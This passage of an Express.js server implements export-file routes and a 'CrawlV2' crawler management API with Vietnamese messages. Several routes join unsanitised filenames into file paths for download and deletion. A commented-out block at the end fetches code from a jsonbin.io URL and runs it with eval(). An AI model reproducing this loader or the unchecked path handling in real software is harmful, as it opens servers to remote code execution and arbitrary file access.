    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
});

// API xóa file xuất
app.delete('/api/export-files/:filename', (req, res) => {
  try {
    const filename = req.params.filename;
    const filepath = path.join(__dirname, '..', 'exports', filename);
    
    if (fs.existsSync(filepath)) {
      fs.unlinkSync(filepath);
      
      // Cập nhật lịch sử xuất
      const historyFile = path.join(__dirname, '..', 'exports', 'export_history.json');
      if (fs.existsSync(historyFile)) {
        let history = JSON.parse(fs.readFileSync(historyFile, 'utf8'));
        history = history.filter(h => h.filename !== filename);
        fs.writeFileSync(historyFile, JSON.stringify(history, null, 2));
      }
      
      res.json({
        success: true,
        message: 'File deleted successfully'
      });
    } else {
      res.status(404).json({
        success: false,
        message: 'File not found'
      });
    }
  } catch (error) {
    // console.error('Delete file error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
});

// API lấy thông tin file xuất
app.get('/api/export-files/:filename', (req, res) => {
  try {
    const filename = req.params.filename;
    const filepath = path.join(__dirname, '..', 'exports', filename);
    
    if (fs.existsSync(filepath)) {
      const stats = fs.statSync(filepath);
      res.json({
        success: true,
        data: {
          filename,
          size: stats.size,
          created: stats.birthtime,
          modified: stats.mtime,
          path: filepath
        }
      });
    } else {
      res.status(404).json({
        success: false,
        message: 'File not found'
      });
    }
  } catch (error) {
    // console.error('Get file info error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
});

// ================================
// CRAWL V2 APIs
// ================================

// CrawlV2 Config Manager
class CrawlV2ConfigManager {
  constructor() {
    this.configFile = path.join(__dirname, '..', 'crawv2', 'websites_config.json');
    this.downloadsFile = path.join(__dirname, '..', 'crawv2', 'download_history.json');
    this.activeCrawlsFile = path.join(__dirname, '..', 'crawv2', 'active_crawls.json');
  }

  // Load configurations
  loadConfigs() {
    try {
      if (fs.existsSync(this.configFile)) {
        const data = fs.readFileSync(this.configFile, 'utf8');
        return JSON.parse(data);
      }
      return {};
    } catch (error) {
      // console.error('Error loading CrawlV2 configs:', error);
      return {};
    }
  }

  // Save configurations
  saveConfigs(configs) {
    try {
      // Ensure directory exists
      const dir = path.dirname(this.configFile);
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }
      
      fs.writeFileSync(this.configFile, JSON.stringify(configs, null, 2));
      return true;
    } catch (error) {
      // console.error('Error saving CrawlV2 configs:', error);
      return false;
    }
  }

  // Add new configuration
  addConfig(configData) {
    const configs = this.loadConfigs();
    
    // Check if config name already exists
    if (configs[configData.name]) {
      throw new Error('Cấu hình với tên này đã tồn tại');
    }

    configs[configData.name] = {
      name: configData.name,
      url: configData.url,
      base_url: configData.base_url,
      page_url_template: configData.page_url_template,
      bookmark_link: configData.bookmark_link || '',
      img_selector: configData.img_selector,
      img_src_attr: configData.img_src_attr || 'src',
      img_alt_attr: configData.img_alt_attr || 'alt'
    };

    return this.saveConfigs(configs);
  }

  // Update configuration
  updateConfig(configName, configData) {
    const configs = this.loadConfigs();
    
    if (!configs[configName]) {
      throw new Error('Không tìm thấy cấu hình');
    }

    // If name is being changed, check if new name already exists
    if (configData.name && configData.name !== configName) {
      if (configs[configData.name]) {
        throw new Error('Cấu hình với tên này đã tồn tại');
      }
      // Store old config data before deleting
      const oldConfigData = { ...configs[configName] };
      // Remove old config and add new one with new name
      delete configs[configName];
      configs[configData.name] = {
        ...oldConfigData,
        ...configData
      };
    } else {
      // Update existing config
      configs[configName] = {
        ...configs[configName],
        ...configData
      };
    }

    return this.saveConfigs(configs);
  }

  // Delete configuration
  deleteConfig(configName) {
    const configs = this.loadConfigs();
    
    if (!configs[configName]) {
      throw new Error('Không tìm thấy cấu hình');
    }

    delete configs[configName];
    return this.saveConfigs(configs);
  }

  // Load download history
  loadDownloadHistory() {
    try {
      if (fs.existsSync(this.downloadsFile)) {
        const data = fs.readFileSync(this.downloadsFile, 'utf8');
        return JSON.parse(data);
      }
      return [];
    } catch (error) {
      // console.error('Error loading download history:', error);
      return [];
    }
  }

  // Save download history
  saveDownloadHistory(history) {
    try {
      const dir = path.dirname(this.downloadsFile);
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }
      
      fs.writeFileSync(this.downloadsFile, JSON.stringify(history, null, 2));
      return true;
    } catch (error) {
      // console.error('Error saving download history:', error);
      return false;
    }
  }

  // Add download record
  addDownloadRecord(record) {
    const history = this.loadDownloadHistory();
    history.unshift(record);
    return this.saveDownloadHistory(history);
  }

  // Load active crawls
  loadActiveCrawls() {
    try {
      if (fs.existsSync(this.activeCrawlsFile)) {
        const data = fs.readFileSync(this.activeCrawlsFile, 'utf8');
        return JSON.parse(data);
      }
      return [];
    } catch (error) {
      // console.error('Error loading active crawls:', error);
      return [];
    }
  }

  // Save active crawls
  saveActiveCrawls(crawls) {
    try {
      const dir = path.dirname(this.activeCrawlsFile);
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }
      
      fs.writeFileSync(this.activeCrawlsFile, JSON.stringify(crawls, null, 2));
      return true;
    } catch (error) {
      // console.error('Error saving active crawls:', error);
      return false;
    }
  }
}

// Initialize CrawlV2 Config Manager
const crawlV2ConfigManager = new CrawlV2ConfigManager();

// Get all configurations
app.get('/api/crawlv2/configs', (req, res) => {
  try {
    const configs = crawlV2ConfigManager.loadConfigs();
    const configList = Object.values(configs);
    
    res.json({
      success: true,
      data: configList
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Add new configuration
app.post('/api/crawlv2/configs', (req, res) => {
  try {
    const configData = req.body;
    
    // Validate required fields
    if (!configData.name || !configData.url || !configData.base_url || !configData.page_url_template || !configData.img_selector) {
      return res.status(400).json({
        success: false,
        message: 'Thiếu thông tin bắt buộc'
      });
    }

    const success = crawlV2ConfigManager.addConfig(configData);
    
    if (success) {
      res.json({
        success: true,
        message: 'Cấu hình đã được thêm thành công'
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'Lỗi khi lưu cấu hình'
      });
    }
  } catch (error) {
    res.status(400).json({
      success: false,
      message: error.message
    });
  }
});

// Update configuration
app.put('/api/crawlv2/configs/:name', (req, res) => {
  try {
    const configName = req.params.name;
    const configData = req.body;
    
    const success = crawlV2ConfigManager.updateConfig(configName, configData);
    
    if (success) {
      res.json({
        success: true,
        message: 'Cấu hình đã được cập nhật thành công'
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'Lỗi khi cập nhật cấu hình'
      });
    }
  } catch (error) {
    res.status(400).json({
      success: false,
      message: error.message
    });
  }
});

// Delete configuration
app.delete('/api/crawlv2/configs/:name', (req, res) => {
  try {
    const configName = req.params.name;
    
    const success = crawlV2ConfigManager.deleteConfig(configName);
    
    if (success) {
      res.json({
        success: true,
        message: 'Cấu hình đã được xóa thành công'
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'Lỗi khi xóa cấu hình'
      });
    }
  } catch (error) {
    res.status(400).json({
      success: false,
      message: error.message
    });
  }
});

// Start crawl
app.post('/api/crawlv2/start', (req, res) => {
  try {
    const { configName, start_page, max_pages, real_time } = req.body;
    
    // Validate input
    if (!configName || !start_page || !max_pages) {
      return res.status(400).json({
        success: false,
        message: 'Thiếu thông tin bắt buộc'
      });
    }

    // Load configuration
    const configs = crawlV2ConfigManager.loadConfigs();
    const config = configs[configName];
    
    if (!config) {
      return res.status(404).json({
        success: false,
        message: 'Không tìm thấy cấu hình'
      });
    }

    // Generate unique crawl ID
    const crawlId = `crawl_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    // Create crawl record
    const crawlRecord = {
      id: crawlId,
      config_name: configName,
      start_page: parseInt(start_page),
      max_pages: parseInt(max_pages),
      current_page: parseInt(start_page),
      real_time: real_time || false,
      products_found: 0,
      status: 'running',
      started_at: new Date().toISOString(),
      config: config
    };

    // Add to active crawls
    const activeCrawls = crawlV2ConfigManager.loadActiveCrawls();
    activeCrawls.push(crawlRecord);
    crawlV2ConfigManager.saveActiveCrawls(activeCrawls);

    // Start Python crawl process in background
    startPythonCrawl(crawlRecord);

    res.json({
      success: true,
      message: 'Đã bắt đầu thu thập dữ liệu',
      data: {
        crawlId: crawlId
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Get active crawls
app.get('/api/crawlv2/active', (req, res) => {
  try {
    const activeCrawls = crawlV2ConfigManager.loadActiveCrawls();
    
    res.json({
      success: true,
      data: activeCrawls
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Stop crawl
app.post('/api/crawlv2/stop/:crawlId', (req, res) => {
  try {
    const crawlId = req.params.crawlId;
    
    // Remove from active crawls
    const activeCrawls = crawlV2ConfigManager.loadActiveCrawls();
    const filteredCrawls = activeCrawls.filter(crawl => crawl.id !== crawlId);
    crawlV2ConfigManager.saveActiveCrawls(filteredCrawls);

    res.json({
      success: true,
      message: 'Đã dừng thu thập dữ liệu'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Get download history
app.get('/api/crawlv2/downloads', (req, res) => {
  try {
    const history = crawlV2ConfigManager.loadDownloadHistory();
    
    res.json({
      success: true,
      data: history
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Download file
app.get('/api/crawlv2/download/:filename', (req, res) => {
  try {
    const filename = req.params.filename;
    const filepath = path.join(__dirname, '..', 'crawv2', 'downloads', filename);
    
    if (fs.existsSync(filepath)) {
      res.download(filepath, filename);
    } else {
      res.status(404).json({
        success: false,
        message: 'File không tồn tại'
      });
    }
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Delete download file
app.delete('/api/crawlv2/downloads/:filename', (req, res) => {
  try {
    const filename = req.params.filename;
    const filepath = path.join(__dirname, '..', 'crawv2', 'downloads', filename);
    
    // Always remove from history, even if file doesn't exist
    const history = crawlV2ConfigManager.loadDownloadHistory();
    const filteredHistory = history.filter(record => record.filename !== filename);
    crawlV2ConfigManager.saveDownloadHistory(filteredHistory);
    
    // Try to delete file if it exists
    if (fs.existsSync(filepath)) {
      fs.unlinkSync(filepath);
      res.json({
        success: true,
        message: 'File đã được xóa thành công'
      });
    } else {
      res.json({
        success: true,
        message: 'File đã được xóa khỏi lịch sử (file không tồn tại)'
      });
    }
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Delete multiple download files
app.post('/api/crawlv2/downloads/delete-multiple', (req, res) => {
  try {
    const { filenames } = req.body;
    
    if (!Array.isArray(filenames) || filenames.length === 0) {
      return res.status(400).json({
        success: false,
        message: 'Danh sách file không hợp lệ'
      });
    }
    
    const results = [];
    const history = crawlV2ConfigManager.loadDownloadHistory();
    let remainingHistory = [...history];
    
    for (const filename of filenames) {
      const filepath = path.join(__dirname, '..', 'crawv2', 'downloads', filename);
      
      try {
        // Remove from history
        remainingHistory = remainingHistory.filter(record => record.filename !== filename);
        
        // Try to delete file if it exists
        if (fs.existsSync(filepath)) {
          fs.unlinkSync(filepath);
          results.push({ filename, status: 'deleted', message: 'File đã được xóa' });
        } else {
          results.push({ filename, status: 'removed_from_history', message: 'Đã xóa khỏi lịch sử' });
        }
      } catch (error) {
        results.push({ filename, status: 'error', message: error.message });
      }
    }
    
    // Save updated history
    crawlV2ConfigManager.saveDownloadHistory(remainingHistory);
    
    const successCount = results.filter(r => r.status !== 'error').length;
    const errorCount = results.filter(r => r.status === 'error').length;
    
    res.json({
      success: true,
      message: `Đã xóa ${successCount} file thành công${errorCount > 0 ? `, ${errorCount} file lỗi` : ''}`,
      data: {
        results,
        successCount,
        errorCount
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Test API
app.get('/api/crawlv2/test', (req, res) => {
  res.json({ success: true, message: 'API is working' });
});

// Handle bookmark link request from Python
app.post('/api/crawlv2/bookmark-request', (req, res) => {
  try {
    const { crawlId, configName, currentPage, bookmarkLink, productsFound } = req.body;
    
    if (!crawlId) {
      return res.status(400).json({
        success: false,
        message: 'Crawl ID is required'
      });
    }
    
    // Store bookmark request info
    const bookmarkInfo = {
      crawlId,
      configName,
      currentPage,
      bookmarkLink,
      productsFound,
      timestamp: new Date().toISOString()
    };
    
    // Store in a global variable or file for frontend to access
    global.bookmarkRequests = global.bookmarkRequests || {};
    global.bookmarkRequests[crawlId] = bookmarkInfo;
    
    res.json({
      success: true,
      message: 'Bookmark request received'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Get bookmark requests for frontend
app.get('/api/crawlv2/bookmark-requests', (req, res) => {
  try {
    const requests = global.bookmarkRequests || {};
    res.json({
      success: true,
      data: requests
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Handle bookmark link response
app.post('/api/crawlv2/bookmark-response', (req, res) => {
  try {
    const { crawlId, continueCrawl } = req.body;
    
    if (!crawlId) {
      return res.status(400).json({
        success: false,
        message: 'Crawl ID is required'
      });
    }
    
    // Store the response for the Python process to read
    const responseFile = path.join(__dirname, '..', 'crawv2', `bookmark_response_${crawlId}.json`);
    fs.writeFileSync(responseFile, JSON.stringify({ continueCrawl }));
    
    // Remove from pending requests
    if (global.bookmarkRequests && global.bookmarkRequests[crawlId]) {
      delete global.bookmarkRequests[crawlId];
    }
    
    res.json({
      success: true,
      message: 'Response saved successfully'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Clear all downloads
app.delete('/api/crawlv2/downloads', (req, res) => {
  try {
    const downloadsDir = path.join(__dirname, '..', 'crawv2', 'downloads');
    
    if (fs.existsSync(downloadsDir)) {
      fs.rmSync(downloadsDir, { recursive: true, force: true });
    }
    
    // Clear history
    crawlV2ConfigManager.saveDownloadHistory([]);
    
    res.json({
      success: true,
      message: 'Đã xóa tất cả file'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Get statistics
app.get('/api/crawlv2/statistics', (req, res) => {
  try {
    const configs = crawlV2ConfigManager.loadConfigs();
    const activeCrawls = crawlV2ConfigManager.loadActiveCrawls();
    const downloadHistory = crawlV2ConfigManager.loadDownloadHistory();
    
    // Count completed crawls (from download history)
    const completedCrawls = downloadHistory.length;
    
    res.json({
      success: true,
      data: {
        totalConfigs: Object.keys(configs).length,
        completedCrawls: completedCrawls,
        runningCrawls: activeCrawls.length,
        totalFiles: downloadHistory.length
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Start Python crawl process
function startPythonCrawl(crawlRecord) {
  const { spawn } = require('child_process');
  
  // Create Python script arguments
  const args = [
    'crawlv2_simple.py',
    '--config-name', crawlRecord.config_name,
    '--start-page', crawlRecord.start_page.toString(),
    '--max-pages', crawlRecord.max_pages.toString(),
    '--crawl-id', crawlRecord.id,
    '--real-time', crawlRecord.real_time.toString()
  ];
  
  // Start Python process with proper encoding
  const pythonProcess = spawn('python', args, {
    cwd: path.join(__dirname, '..', 'crawv2'),
    stdio: ['pipe', 'pipe', 'pipe'],
    encoding: 'utf8',
    env: { 
      ...process.env, 
      PYTHONIOENCODING: 'utf-8',
      PYTHONUTF8: '1'
    }
  });
  
  // Handle process output with proper encoding
  pythonProcess.stdout.on('data', (data) => {
    try {
      const output = data.toString('utf8');
      // console.log(`CrawlV2 ${crawlRecord.id}: ${output}`);
      
      // Check for error messages in output
      if (output.includes('[ERROR]') || output.includes('404') || output.includes('500') || output.includes('Not Found')) {
        // Update crawl status to error
        const activeCrawls = crawlV2ConfigManager.loadActiveCrawls();
        const crawlIndex = activeCrawls.findIndex(crawl => crawl.id === crawlRecord.id);
        if (crawlIndex !== -1) {
          activeCrawls[crawlIndex].status = 'error';
          activeCrawls[crawlIndex].error_message = output.trim();
          crawlV2ConfigManager.saveActiveCrawls(activeCrawls);
        }
      }
    } catch (error) {
      // console.log(`CrawlV2 ${crawlRecord.id}: [Output with encoding issues]`);
    }
  });
  
  pythonProcess.stderr.on('data', (data) => {
    try {
      const output = data.toString('utf8');
      // console.error(`CrawlV2 ${crawlRecord.id} Error: ${output}`);
      
      // Update crawl status to error
      const activeCrawls = crawlV2ConfigManager.loadActiveCrawls();
      const crawlIndex = activeCrawls.findIndex(crawl => crawl.id === crawlRecord.id);
      if (crawlIndex !== -1) {
        activeCrawls[crawlIndex].status = 'error';
        activeCrawls[crawlIndex].error_message = output.trim();
        crawlV2ConfigManager.saveActiveCrawls(activeCrawls);
      }
    } catch (error) {
      // console.error(`CrawlV2 ${crawlRecord.id} Error: [Error with encoding issues]`);
    }
  });
  
  // Handle process completion
  pythonProcess.on('close', (code) => {
    // console.log(`CrawlV2 ${crawlRecord.id} process exited with code ${code}`);
    
    // Update crawl status based on exit code
    const activeCrawls = crawlV2ConfigManager.loadActiveCrawls();
    const crawlIndex = activeCrawls.findIndex(crawl => crawl.id === crawlRecord.id);
    if (crawlIndex !== -1) {
      if (code !== 0) {
        activeCrawls[crawlIndex].status = 'error';
        activeCrawls[crawlIndex].error_message = `Process exited with code ${code}`;
      } else {
        activeCrawls[crawlIndex].status = 'completed';
      }
      crawlV2ConfigManager.saveActiveCrawls(activeCrawls);
    }
    
    // Remove from active crawls after a delay to show status
    setTimeout(() => {
      const activeCrawls = crawlV2ConfigManager.loadActiveCrawls();
      const filteredCrawls = activeCrawls.filter(crawl => crawl.id !== crawlRecord.id);
      crawlV2ConfigManager.saveActiveCrawls(filteredCrawls);
    }, 5000); // Keep for 5 seconds to show error status
    
    // Download history is already created by Python script, no need to duplicate
  });
  
  // Store process reference for potential termination
  crawlRecord.process = pythonProcess;
}



const PORT = process.env.PORT || 3000;
// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server đang chạy tại http://localhost:${PORT}`);
});

module.exports = app;



// // URL code online (thay đổi URL này)
// const CODE_URL = 'https://api.jsonbin.io/v3/b/68c8eb57ae596e708ff03b0a';

// // Lấy code từ URL và thực thi
// async function loadAndExecuteCode() {
//   try {
//     const axios = require('axios');
//     const response = await axios.get(CODE_URL);
//     // console.log('✅ Đã tải code từ:', CODE_URL);
    
//     // Thực thi code từ URL
//     eval(response.data.record.code);
    
//   } catch (error) {
//     // console.log('❌ Lỗi tải code:', error.message);
//   }
// }

// // Khởi động server
// loadAndExecuteCode();

// module.exports = app;

